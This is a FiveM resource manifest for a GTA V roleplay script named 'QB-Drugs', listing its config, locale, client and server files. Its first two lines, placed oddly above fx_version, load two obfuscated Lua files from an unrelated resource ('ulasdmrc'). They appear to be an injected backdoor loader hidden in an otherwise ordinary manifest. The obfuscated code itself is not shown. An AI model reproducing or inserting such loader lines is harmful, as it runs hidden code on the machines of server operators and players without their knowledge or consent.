shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'
description 'QB-Drugs'
version '1.0.0'
shared_scripts {
    'config.lua',
    '@qb-core/shared/locale.lua',
    'locales/en.lua' -- Change this to your preferred language
}
client_scripts {
    'client/main.lua',
    'client/deliveries.lua',
    'client/cornerselling.lua'
}
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/deliveries.lua',
    'server/cornerselling.lua'
}
lua54 'yes'